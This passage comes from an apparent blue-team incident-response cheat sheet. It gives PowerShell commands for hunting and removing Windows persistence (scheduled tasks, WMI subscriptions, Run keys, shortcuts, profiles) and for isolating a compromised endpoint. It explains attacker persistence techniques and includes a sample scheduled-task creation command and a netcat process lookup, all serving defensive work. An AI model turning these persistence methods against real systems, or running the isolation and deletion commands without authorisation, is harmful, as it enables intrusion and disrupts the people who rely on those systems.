Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
#Firewall it out too
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
### Query RDP Logs 
Knowing who is RDPing in your enviroment, and from where, is important. Unfortunately, RDP logs are balllache. [Threat hunting blogs like this one](https://research.nccgroup.com/2021/10/21/detecting-and-protecting-when-remote-desktop-protocol-rdp-is-open-to-the-internet/) can help you narrow down what you are looking for when it comes to RDP 

Let's call on one of the RDP logs, and filter for event ID 1149, which means a RDP connection has been made. Then let's filter out any IPv4 addresses that begin with 10.200, as this is the internal IP schema. Perhaps I want to hunt down public IP addresses, as this would suggest the RDP is exposed to the internet on the machine and an adversary has connected with correct credentials!!!

[Two logs of interest](https://www.security-hive.com/post/rdp-forensics-logging-detection-and-forensics)
* Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
* Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx

```powershell
# if you acquire a log, change this to get-winevent -path ./RDP_log_you_acquired.evtx
get-winevent -path "./Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx" | 
? id -match 1149 | 
sort Time* -descending | 
fl time*, message

get-winevent -path ./ "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx" | 
? id -match 21 | 
sort Time* -descending | 
fl time*, message
```

![image](https://user-images.githubusercontent.com/44196051/138730646-0740a2f5-de35-4e2d-8c9a-79323d84f325.png)


### Current RDP Sessions
You can query the RDP sessions that a [system is currently running](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta)

```cmd
qwinsta

:: get some stats
qwinsta /counter
```

![image](https://user-images.githubusercontent.com/44196051/141457332-edf06c5d-9dfa-4ae8-b3c5-ed0a9db4db05.png)

You can read here about [how to evict](#Evict-Users) a malicious user from a session and change the creds rapidly to deny them future access

### Check Certificates

```powershell
gci "cert:\" -recurse | fl FriendlyName, Subject, Not* 
```

![image](https://user-images.githubusercontent.com/44196051/121305446-7d51fd00-c8f5-11eb-918b-da6b7f09d2eb.png)

#### Certificate Dates

You will be dissapointed how many certificates are expired but still in use. Use the `-ExpiringInDays` flag

```powershell
 gci "cert:\*" -recurse -ExpiringInDays 0 | fl FriendlyName, Subject, Not*  
 
```

## Firewall Queries

<details>
    <summary>section contents</summary>

  + [Retreieve Firewall profile names](#retreieve-firewall-profile-names)
    - [Retrieve rules of specific profile](#retrieve-rules-of-specific-profile)
  + [Filter all firewall rules](#filter-all-firewall-rules)
  + [Code Red](#code-red)
    - [Isolate Endpoint](#isolate-endpoint)

</details>

### Retrieve Firewall profile names
```powershell
(Get-NetFirewallProfile).name
```
![image](https://user-images.githubusercontent.com/44196051/120560271-53cb3a00-c3fa-11eb-83f7-f60f431d0c7b.png)

#### Retrieve rules of specific profile
Not likely to be too useful getting all of this information raw, so add plenty of filters
```powershell
Get-NetFirewallProfile -Name Public | Get-NetFirewallRule
##filtering it to only show rules that are actually enabled
Get-NetFirewallProfile -Name Public | Get-NetFirewallRule | ? Enabled -eq "true"
```
![image](https://user-images.githubusercontent.com/44196051/120560766-3cd91780-c3fb-11eb-9781-bf933c4b0efa.png)

### Filter all firewall rules
```powershell

#show firewall rules that are enabled
Get-NetFirewallRule | ? Enabled -eq "true"
#will show rules that are not enabled
Get-NetFirewallRule | ? Enabled -notmatch "true"

##show firewall rules that pertain to inbound
Get-NetFirewallRule | ? direction -eq "inbound"
#or outbound
Get-NetFirewallRule | ? direction -eq "outbound"

##stack these filters
Get-NetFirewallRule | where {($_.Enabled -eq "true" -and $_.Direction -eq "inbound")}
#or just use the built in flags lol
Get-NetFirewallRule -Enabled True -Direction Inbound
```

### Code Red

#### Isolate Endpoint
Disconnect network adaptor, firewall the fuck out of an endpoint, and display warning box

This is a code-red command. Used to isolate a machine in an emergency.

In the penultimate and final line, you can change the text and title that will pop up for the user

```powershell
New-NetFirewallRule -DisplayName "Block all outbound traffic" -Direction Outbound -Action Block | out-null; 
New-NetFirewallRule -DisplayName "Block all inbound traffic" -Direction Inbound -Action Block | out-null; 
$adapter = Get-NetAdapter|foreach { $_.Name } ; Disable-NetAdapter -Name "$adapter" -Confirm:$false; 
Add-Type -AssemblyName PresentationCore,PresentationFramework; 
[System.Windows.MessageBox]::Show('Your Computer has been Disconnected from the Internet for Security Issues. Please do not try to re-connect to the internet. Contact Security Helpdesk Desk ',' CompanyNameHere Security Alert',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Information)
```
![image](https://user-images.githubusercontent.com/44196051/119979598-0e9aa880-bfb3-11eb-9882-08d02a0d3026.png)

---


---

## SMB Queries

<details>
    <summary>section contents</summary>

  + [List Shares](#list-shares)
  + [List client-to-server SMB Connections](#list-client-to-server-smb-connections)
  + [Remove an SMB Share](#remove-an-smb-share)

</details>

### List Shares
```powershell
  Get-SMBShare
```
![image](https://user-images.githubusercontent.com/44196051/120796972-5c735b80-c533-11eb-8502-888440c21e94.png)

### List client-to-server SMB Connections
Dialect just means verison. SMB3, SMB2 etc

``` powershell
Get-SmbConnection
 
#just show SMB Versions being used. Great for enumeration flaws in enviro - i.e, smb1 being used somewhere
Get-SmbConnection |
select Dialect, Servername, Sharename | sort Dialect   
```
![image](https://user-images.githubusercontent.com/44196051/120797516-0eab2300-c534-11eb-9568-7753ad58cdf7.png)

![image](https://user-images.githubusercontent.com/44196051/120797860-795c5e80-c534-11eb-87fb-cc02ca70b4b0.png)

### Remove an SMB Share
```powershell
Remove-SmbShare -Name MaliciousShare -Confirm:$false -verbose
```

---

## Process Queries

<details>
    <summary>section contents</summary>
  
  + [Processes and TCP Connections](#processes-and-tcp-connections)
  + [Show all processes and their associated user](#show-all-processes-and-their-associated-user)
  + [Get specific info about the full path binary that a process is running](#get-specific-info-about-the-full-path-binary-that-a-process-is-running)
  + [Is a specific process a running on a machine or not](#is-a-specific-process-a-running-on-a-machine-or-not)
  + [Get process hash](#get-process-hash)
  + [Show all DLLs loaded with a process](#show-all-dlls-loaded-with-a-process)
  + [Identify process CPU usage](#identify-process-cpu-usage)
    - [Sort by least CPU-intensive processes](#sort-by-least-cpu-intensive-processes)
  + [Stop a Process](#stop-a-process)
  + [Process Tree](#process-tree) 
  
</details>

### Processes and TCP Connections
I have a neat one-liner for you. This will show you the local IP and port, the remote IP andport, the process name, and the underlying executable of the process!

You could just use `netstat -b`, which gives you SOME of this data

![image](https://user-images.githubusercontent.com/44196051/150956623-7328b24b-4edd-4be7-bf94-f79472650b58.png)


But instead, try this bad boy on for size:

```powershell
Get-NetTCPConnection |
select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} | 
sort Remoteaddress -Descending | ft -wrap -autosize
```

![image](https://user-images.githubusercontent.com/44196051/150955379-872e2b5f-6d88-4b3f-929f-debaa8fd1036.png)

### Show all processes and their associated user

```powershell
get-process * -Includeusername
```

![image](https://user-images.githubusercontent.com/44196051/120329122-70288300-c2e3-11eb-95ef-276ffd556acd.png)


Try this one if you're hunting down suspicious processes from users

```powershell
gwmi win32_process | 
Select Name,@{n='Owner';e={$_.GetOwner().User}},CommandLine | 
sort Name -unique -descending | Sort Owner | ft -wrap -autosize
```

![image](https://user-images.githubusercontent.com/44196051/150958834-782846e5-bd2b-4bbc-9305-df3e24021052.png)


### Get specific info about the full path binary that a process is running
```powershell
gwmi win32_process | 
Select Name,ProcessID,@{n='Owner';e={$_.GetOwner().User}},CommandLine | 
sort name | ft -wrap -autosize | out-string
```

![image](https://user-images.githubusercontent.com/44196051/120901193-4350d480-c631-11eb-81c4-41c832d064de.png)


### Get specific info a process is running
```powershell
get-process -name "nc" | ft Name, Id, Path,StartTime,Includeusername -autosize 
```
![Images](https://user-images.githubusercontent.com/44196051/120901392-78a9f200-c632-11eb-84df-2168226375a7.png)

### Is a specific process a running on a machine or not
```powershell
$process = "memes";
if (ps |  where-object ProcessName -Match "$process") {Write-Host "$process successfully installed on " -NoNewline ; hostname} else {write-host "$process absent from " -NoNewline ; hostname}
```

Example of process that is absent
![image](https://user-images.githubusercontent.com/44196051/119976215-b1045d00-bfae-11eb-806c-49a62f5aab15.png)
Example of process that is present
![image](https://user-images.githubusercontent.com/44196051/119976374-ea3ccd00-bfae-11eb-94cd-37ed4233564d.png)

### Get process hash
Great to make malicious process stand out. If you want a different Algorithm, just change it after `-Algorithm` to something like `sha256` 
```powershell
foreach ($proc in Get-Process | select path -Unique){try
{ Get-FileHash $proc.path -Algorithm sha256 -ErrorAction stop |
ft hash, path -autosize -HideTableHeaders | out-string -width 800 }catch{}}
```
![image](https://user-images.githubusercontent.com/44196051/119976802-8cf54b80-bfaf-11eb-82de-1a92bbcae4f9.png)

### Show all DLLs loaded with a process
```powershell
get-process -name "memestask" -module 
```
![image](https://user-images.githubusercontent.com/44196051/119976958-bdd58080-bfaf-11eb-8833-7fdf78045967.png)

Alternatively, pipe `|fl` and it will give a granularity to the DLLs

![image](https://user-images.githubusercontent.com/44196051/119977057-db0a4f00-bfaf-11eb-97ce-1e762088de8e.png)

### Identify process CPU usage 
```powershell
 (Get-Process -name "googleupdate").CPU | fl 
```
![image](https://user-images.githubusercontent.com/44196051/119982198-756d9100-bfb6-11eb-8645-e41cf46116b3.png)

I get mixed results with this command but it's supposed to give the percent of CPU usage. I need to work on this, but I'm putting it in here so the world may bare wittness to my smooth brain. 
```powershell
$ProcessName = "symon" ; 
$ProcessName = (Get-Process -Id $ProcessPID).Name; 
$CpuCores = (Get-WMIObject Win32_ComputerSystem).NumberOfLogicalProcessors; 
$Samples = (Get-Counter "\Process($Processname*)\% Processor Time").CounterSamples; 
$Samples | Select `InstanceName,@{Name="CPU %";Expression={[Decimal]::Round(($_.CookedValue / $CpuCores), 2)}}
```
![image](https://user-images.githubusercontent.com/44196051/119982326-9a620400-bfb6-11eb-9a66-ad5a5661bc8a.png)

### Sort by least CPU-intensive processes

Right now will show the lower cpu-using proccesses...useful as malicious process probably won't be as big a CPU as Chrome, for example. But change first line to `Sort CPU -descending` if you want to see the chungus processes first

```powershell
gps | Sort CPU |
Select -Property ProcessName, CPU, ID, StartTime | 
ft -autosize -wrap | out-string -width 800
```

![image](https://user-images.githubusercontent.com/44196051/120922422-f87e9d80-c6c0-11eb-8901-77ba9c95432c.png)

### Stop a Process
```powershell
Get-Process -Name "memeprocess" | Stop-Process -Force -Confirm:$false -verbose
```

### Process Tree
You can download the [PsList exe from Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/pslist)

Fire it off with the `-t` flag to create a parent-child tree of the processes

![example_of_ps_tree](https://user-images.githubusercontent.com/44196051/151773540-e89e9d9a-92fc-472e-94b9-e1f552dedf4f.png)


---

## Recurring Task Queries

<details>
    <summary>section contents</summary>
  
  + [Get scheduled tasks](#get-scheduled-tasks)
    - [Get a specific schtask](#get-a-specific-schtask)
    - [To find the commands a task is running](#to-find-the-commands-a-task-is-running)
    - [To stop the task](#to-stop-the-task)
    - [All schtask locations](#all-schtask-locations) 
    - [Sneaky Schtasks via the Registry](#Sneaky-Schtasks-via-the-Registry)
  + [Show what programs run at startup](#show-what-programs-run-at-startup)
    - [Programs at login](#programs-at-login)
    - [Programs at PowerShell](#programs-at-powershell) 
  + [Stolen Links](#stolen-links) 
  + [Scheduled Jobs](#scheduled-jobs)
    - [Find out what scheduled jobs are on the machine](#find-out-what-scheduled-jobs-are-on-the-machine)
    - [Get detail behind scheduled jobs](#get-detail-behind-scheduled-jobs)
    - [Kill job](#kill-job)
  + [Hunt WMI Persistence](#hunt-wmi-persistence)
    - [Removing it](#removing-it)
    - [A note on CIM](#a-note-on-cim)
  + [Run Keys](#Run-Keys)
    - [What are Run Keys](#what-are-run-keys)
    - [Finding Run Evil](#Finding-Run-Evil)
    - [Removing Run Evil](#removing-run-evil)
    - [Other Malicious Run Locations](#other-malicious-run-locations)
    - [Evidence of Run Key Execution](#Evidence-of-Run-Key-Execution)
  + [Screensaver Persistence](#Screensaver-Persistence) 
  + [Query Group Policy](#Query-Group-Policy)
    - [Query GPO Scripts](#query-gpo-scripts)
  + [Autoruns](#autoruns)

</details>

### Get scheduled tasks
Identify the user behind a command too. Great at catching out malicious schtasks that perhaps are imitating names, or a process name
```powershell
schtasks /query /FO CSV /v | convertfrom-csv |
where { $_.TaskName -ne "TaskName" } |
select "TaskName","Run As User", Author, "Task to Run"| 
fl | out-string
```
![image](https://user-images.githubusercontent.com/44196051/120901651-27026700-c634-11eb-9aa2-6a4812450ac2.png)

#### Get a specific schtask
```powershell
Get-ScheduledTask -Taskname "wifi*" | fl *
```
![image](https://user-images.githubusercontent.com/44196051/120563312-2d100200-c400-11eb-8f47-cd3e76df4165.png)

#### To find the commands a task is running
Great one liner to find exactly WHAT a regular task is doing
```powershell
$task = Get-ScheduledTask | where TaskName -EQ "meme task"; 
$task.Actions
```
![image](https://user-images.githubusercontent.com/44196051/119979087-5f5dd180-bfb2-11eb-9d4d-bbbf66043535.png)

And a command to get granularity behind the schtask requires you to give the taskpath. Tasks with more than one taskpath will throw an error here
```powershell
$task = "CacheTask";
get-scheduledtask -taskpath (Get-ScheduledTask -Taskname "$task").taskpath | Export-ScheduledTask
#this isn't the way the microsoft docs advise. 
     ##But I prefer this, as it means I don't need to go and get the taskpath when I already know the taskname
```
![image](https://user-images.githubusercontent.com/44196051/120563667-18803980-c401-11eb-9b10-621169f38437.png)

#### To stop the task
```powershell
Get-ScheduledTask "memetask" | Stop-ScheduledTask -Force -Confirm:$false -verbose
```
#### All schtask locations
There's some major overlap here, but it pays to be thorough. 

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks
C:\Windows\System32\Tasks
C:\Windows\Tasks
C:\windows\SysWOW64\Tasks\
```

You can compare the above for tasks missing from the C:\Windows directories, but present in the Registry.

```powershell
# From my man Anthony Smith - https://www.linkedin.com/in/anthony-c-smith/

$Reg=(Get-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\tree\*").PsChildName
$XMLs = (ls C:\windows\System32\Tasks\).Name
Compare-Object $Reg $XMLs
```

<img width="1180" alt="image" src="https://user-images.githubusercontent.com/44196051/214910299-a82ec894-7f16-44b8-92a3-b6344a09925d.png">


#### Sneaky Schtasks via the Registry
Threat actors have been known to manipulate scheduled tasks in such a way that Task Scheduler no longer has visibility of the recuring task. 

However, querying the Registry locations `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree` and `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks`, can reveal a slice of these sneaky tasks.

Shout out to my man [@themalwareguy](https://twitter.com/themalwareguy) for the $fixedstring line that regexes in/out good/bad characters. 

```Powershell
# the schtask for our example
# schtasks /create /tn "Find_Me" /tr calc.exe /sc minute /mo 100 /k

# Loop and parse \Taskcache\Tasks Registry location for scheduled tasks
  ## Parses Actions to show the underlying binary / commands for the schtask
  ## Could replace Actions with Trigggers on line 10, after ExpandedProperty
(Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\*").PSChildName | 
Foreach-Object {
  write-host "----Schtask ID is $_---" -ForegroundColor Magenta ;
  $hexstring = Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\$_" | Select -ExpandProperty Actions;
  $fixedstring = [System.Text.Encoding]::Unicode.GetString($hexstring) -replace '[^a-zA-Z0-9\\._\-\:\%\/\$ ]', ' '; # Obtaining the Unicode string reduces the chances of getting invalid characters, and the regex will assist in stripping each string of junk
  write-host $fixedstring
}
```
<img width="1423" alt="image" src="https://user-images.githubusercontent.com/44196051/214888721-8a89b9db-3486-4a76-bd97-446eedc38303.png">

If you don't need to loop to search, because you know what you're gunning for then you can just deploy this
```powershell
$hexstring = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\{ID}" | 
Select -ExpandProperty Actions) -join ',' ; $hexstring.Split(" ")
## can then go to cyberchef, and convert From Decimal with the comma (,) delimineter 
```
<img width="1433" alt="image" src="https://user-images.githubusercontent.com/44196051/214889168-91ebdbe5-ac86-41f5-ba44-e5860ed0615a.png">

Once you've deployed the above loop, and zoned in on a binary / one-liner that seems sus, you can query it in the other Registry location

```PowerShell
# Then for the ID of interest under \Taskcache\Tree subkey
  # Example: $ID = "{8E350038-3475-413A-A1AE-20711DD11C95}" ;  
$ID = "{XYZ}" ; 
get-itemproperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree\*" | 
? Id -Match "$ID" | fl *Name,Id,PsPath
```

<img width="1325" alt="image" src="https://user-images.githubusercontent.com/44196051/214890947-55f67e6c-7b4b-492d-98c1-8d9ad49e1497.png">


And then eradicating these Registry schtask entries is straight forward via Regedit's GUI, that way you have no permission problems. Delete both:
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\\{$ID}
* HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree\\$Name

<img width="1017" alt="image" src="https://user-images.githubusercontent.com/44196051/214887239-8bdcce93-c218-47c4-a346-1498346625a9.png">
<img width="1015" alt="image" src="https://user-images.githubusercontent.com/44196051/214888207-5bb0767b-56f8-4689-8925-9caeae9b5f62.png">


### Show what programs run at startup
```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List 
```
![image](https://user-images.githubusercontent.com/44196051/120332890-12963580-c2e7-11eb-9805-feee341140fa.png)

Some direct path locations too can be checked
```powershell
HKLM\software\classes\exefile\shell\open\command
c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup
```

Querying that last one in more detail, you have some interesting options
```powershell
#Just list out the files in each user's startup folder
(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname

#Extract from the path User, Exe, and print machine name
(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname | 
foreach-object {$data = $_.split("\\");write-output "$($data[2]), $($data[10]), $(hostname)"}

#Check the first couple lines of files' contents
(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname | 
foreach-object {write-host `n$_`n; gc $_ -encoding byte| fhx |select -first 5}
```
<img width="1000" alt="image" src="https://user-images.githubusercontent.com/44196051/216298167-e3a112bf-6d48-43b5-9b2c-fc9d47d50cc8.png">

#### Programs at login
Adversaries can link persistence mechanisms to be activated to a users' login via the registry `HKEY_CURRENT_USER\Environment -UserInitMprLogonScript`

```powershell
#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

#list all user's enviros
(gp "HKU:\*\Environment").UserInitMprLogonScript

#Collect SID of target user with related logon task
gp "HKU:\*\Environment" | FL PSParentPath,UserInitMprLogonScript

# insert SID and convert it into username
gwmi win32_useraccount | 
select Name, SID | 
? SID -match "" #insert SID between quotes 
```

<img width="949" alt="image" src="https://user-images.githubusercontent.com/44196051/172841004-ba253267-4619-4983-bd61-90c4e1623de0.png">

You can remove this regsistry entry

```powershell
#confirm via `whatif` flag that this is the right key
remove-itemproperty "HKU:\SID-\Environment\" -name "UserInitMprLogonScript" -whatif
#delete it
remove-itemproperty "HKU:\SID-\Environment\" -name "UserInitMprLogonScript" -verbose
```

<img width="1415" alt="image" src="https://user-images.githubusercontent.com/44196051/172841461-c39ab569-288c-4484-b8e5-59a0ff5b1e8a.png">

#### Programs at Powershell
Adversaries can link their persistence mechanisms to a PowerShell profile, executing their malice every time you start PowerShell

```powershell
#confirm the profile you are querying
echo $Profile
#show PowerShell profile contents
type $Profile
```
![image](https://user-images.githubusercontent.com/44196051/148917480-5c3adfba-e9cd-4e16-9e5b-439de153cc1c.png)

To fix this one, I'd just edit the profile and remove the persistence (so `notepad $Profile` will be just fine)

You can get a bit more clever with this if you want

```powershell
(gci C:\Users\*\Documents\WindowsPowerShell\*profile.ps1, C:\Windows\System32\WindowsPowerShell\v1.0\*profile.ps1).FullName|
Foreach-Object {
  write-host "----$_---" -ForegroundColor Magenta ; 
  gc $_ # | select-string -notmatch function ## if you want to grep out stuff you don't wanna see, uncomment
}
```
<img width="1223" alt="image" src="https://user-images.githubusercontent.com/44196051/216776621-ab30be1e-583f-45f7-b650-7918bbb73b82.png">


### Stolen Links
Adversaries can insert their malice into shortcuts. They can do it in clever ways, so that the application will still run but at the same time their malice will also execute when you click on the application

For demo purposes, below we have Microsoft Edge that has been hijacked to execute calc on execution. 

![image](https://user-images.githubusercontent.com/44196051/148918419-45845f19-84e7-44aa-a8e0-c6310ee4a905.png)

We can specifically query all Microsoft Edge's shortcuts to find this
```powershell
Get-CimInstance Win32_ShortcutFile | 
? FileName -match 'edge' | 
fl FileName,Name,Target, LastModified
```

![image](https://user-images.githubusercontent.com/44196051/148921262-3a9019ce-3b95-4f95-962f-db41871162fd.png)

This doesn't scale however, as you will not know the specific shortcut that the adversary has manipulated. So instead, sort by the `LastModified` date

```powershell
Get-CimInstance Win32_ShortcutFile | 
sort LastModified -desc | 
fl FileName,Name,Target, LastModified
```

![image](https://user-images.githubusercontent.com/44196051/148921953-725bc874-0d30-4eb1-92c4-86714d947c90.png)

#### Hunt LNKs at scale

This above will output a LOT, however. You may want to only show results for anything LastModified after a certain date. Lets ask to only see things modified in the year 2022 onwards

```powershell
Get-CimInstance Win32_ShortcutFile |
where-object {$_.lastmodified -gt [datetime]::parse("01/01/2022")} | 
sort LastModified -desc | fl FileName,Name,Target, LastModified
```

![image](https://user-images.githubusercontent.com/44196051/148923043-81b092d5-cf05-4ab8-afcc-a662a0e34651.png)


### Scheduled Jobs
Surprisingly, not many people know about [Scheduled Jobs](https://devblogs.microsoft.com/scripting/introduction-to-powershell-scheduled-jobs/). They're not anything too strange or different, they're just scheduled tasks that are specificially powershell. 

[I've written about a real life encounter I had during an incident](https://labs.jumpsec.com/powershell-jobs/), where the adversary had leveraged a PowerShell scheduled job to execute their malice at an oppertune time

#### Find out what scheduled jobs are on the machine
```powershell
 Get-ScheduledJob
 # pipe to | fl * for greater granularity
```
![image](https://user-images.githubusercontent.com/44196051/120564374-a7418600-c402-11eb-8b7c-92fd86c9df2f.png)

#### Get detail behind scheduled jobs
```powershell
Get-ScheduledJob | Get-JobTrigger | 
Ft -Property @{Label="ScheduledJob";Expression={$_.JobDefinition.Name}},ID,Enabled, At, frequency, DaysOfWeek
#pipe to fl or ft, whatever you like the look of more in the screenshot
```

![image](https://user-images.githubusercontent.com/44196051/120564784-92192700-c403-11eb-930a-3aa0ba178434.png)

#### Kill job
The following all work.
```powershell
Disable-ScheduledJob -Name evil_sched
Unregister-ScheduledJob -Name eviler_sched
Remove-Job -id 3 
#then double check it's gone with Get-ScheduledJob

#if persists, tack on to unregister or remove-job
-Force -Confirm:$false -verbose
```

### Hunt WMI Persistence

WMIC can do some pretty evil things [1](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf) & [2](https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/). One sneaky, pro-gamer move it can pull is *persistence*

In the image below I have included a part of setting up WMI persistence

![image](https://user-images.githubusercontent.com/44196051/122431376-4ed6c080-cf8c-11eb-9538-55f6e0e7c7a5.png)


##### Finding it
Now, our task is to find this persistent evil.

Get-CimInstance comes out cleaner, but you can always rely on the alternate Get-WMIObject

```powershell

Get-CimInstance -Namespace root\Subscription -Class __FilterToConsumerBinding
Get-CimInstance -Namespace root\Subscription -Class __EventFilter
Get-CimInstance -Namespace root\Subscription -Class __EventConsumer

## OR

Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
```

![image](https://user-images.githubusercontent.com/44196051/122433194-e7217500-cf8d-11eb-94b1-957254bf0f4c.png)
![image](https://user-images.githubusercontent.com/44196051/122433360-0fa96f00-cf8e-11eb-90f6-4c3baafaeddd.png)
![image](https://user-images.githubusercontent.com/44196051/122433449-26e85c80-cf8e-11eb-9226-ce9f6985d76b.png)

#### Removing it

Now we've identified the evil WMI persistence, let us be rid of it! 

We can specify the Name as `EVIL` as that's what it was called across the three services. Whatever your persistence calls itself, change the name for that

```powershell
#notice this time, we use the abbrevated version of CIM and WMI

gcim -Namespace root\Subscription -Class __EventFilter | 
? Name -eq "EVIL" | Remove-CimInstance -verbose

gcim -Namespace root\Subscription -Class __EventConsumer| 
? Name -eq "EVIL" | Remove-CimInstance -verbose

#it's actually easier to use gwmi here instead of gcim
gwmi -Namespace root\Subscription -Class __FilterToConsumerBinding | 
? Consumer -match "EVIL" | Remove-WmiObject -verbose
```

![image](https://user-images.githubusercontent.com/44196051/122436413-b55ddd80-cf90-11eb-9cb5-7854ddf6225d.png)


#### A note on CIM 

You may see WMI and CIM talked about together, whether on the internet or on in the Blue Team Notes here. 

CIM is a standard for language for vendor-side management of a lot of the physical and digital mechanics of what makes a computer tick. WMIC was and is Microsoft's interpretation of CIM. 

However, Microsoft is going to decommision WMIC soon. So using `Get-Ciminstance` versions rather than `get-wmiobject` is probably better for us to learn in the long term. I dunno man, [It's complicated](https://devblogs.microsoft.com/scripting/should-i-use-cim-or-wmi-with-windows-powershell/). 


### Run Keys
#### What are Run Keys

I've written in depth [about run keys, elsewhere](https://labs.jumpsec.com/running-once-running-twice-pwned-windows-registry-run-keys/)

Run and RunOnce registry entries will run tasks on startup. Specifically: 

* Run reg keys will run the task every time there's a login. 
* RunOnce reg kgeys will run the taks once and then self-delete keys. 
  * If a RunOnce key has a name with an exclemation mark (!likethis) then it will self-delete
  * IF a RunOnce key has a name with an asterik (* LikeDIS) then it can run even in Safe Mode.  

If you look in the reg, you'll find some normal executables. 

![image](https://user-images.githubusercontent.com/44196051/124326535-76c64680-db7e-11eb-9b98-261b3704d30a.png)


### Finding Run Evil

A quick pwsh _for loop_ can collect the contents of the four registry locations. 

```powershell
#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

(gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ).Pspath |
Foreach-Object {
  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
  gp $_ | 
  select -property * -exclude PS*, One*, vm* | #exclude results here
  FL
}

#you can squish that all in one line if you need to
(gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ).Pspath | Foreach-Object {write-host "----Reg location is $_---" -ForegroundColor Magenta ; gp $_ | select -property * -exclude PS*, One*, vm* |sort| fl}
```

<img width="1353" alt="image" src="https://user-images.githubusercontent.com/44196051/202874165-d0aa355d-dfba-4e64-af5b-ff1b016e910f.png">


You can also achieve the same thing with these two alternative commands, but it isn't as cool as the above for loop

```powershell

get-itemproperty "HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run*" | 
  select -property * -exclude PSPR*,PSD*,PSC*,PSPAR*  | fl
get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run*" | 
  select -property * -exclude PSPR*,PSD*,PSC*,PSPAR*  | fl
```

<img width="1401" alt="image" src="https://user-images.githubusercontent.com/44196051/202874181-7679be09-a11f-42b9-8257-9f4bae8b4714.png">


### Removing Run evil

Be surgical here. You don't want to remove Run entries that are legitimate. It's important you remove with -verbose too and double-check it has gone, to make sure you have removed what you think you have. 

Specify the SID

```powershell
#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

#List the malicious reg by path
get-itemproperty "HKU:\SID\Software\Microsoft\Windows\CurrentVersion\RunOnce" | select -property * -exclude PS* | fl

#Then pick the EXACT name of the Run entry you want to remove. Copy paste it, include any * or ! too please
Remove-ItemProperty -Path "HKU:\SID-\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "*EvilerRunOnce" -verbose

#Then check again to be sure it's gone
get-itemproperty "HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce" | select -property * -exclude PS* | fl
```

![image](https://user-images.githubusercontent.com/44196051/124332253-f9ec9a00-db88-11eb-9007-017dfa956707.png)


### Other Malicious Run Locations

Some *folders* can be the locations of persistence. 

```powershell
#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

$folders = @("HKU:\*\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders","HKU:\*\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")
foreach ($folder in $folders) {
  write-host "----Reg key is $folder--- -ForegroundColor Magenta "; 
  get-itemproperty -path "$folder"  | 
  select -property * -exclude PS* | fl
}

```
![image](https://user-images.githubusercontent.com/44196051/124331784-df65f100-db87-11eb-8c52-3bb697496cdb.png)

Svchost startup persistence

```powershell

get-itemproperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
```
![image](https://user-images.githubusercontent.com/44196051/124331810-edb40d00-db87-11eb-8712-c1028302847f.png)


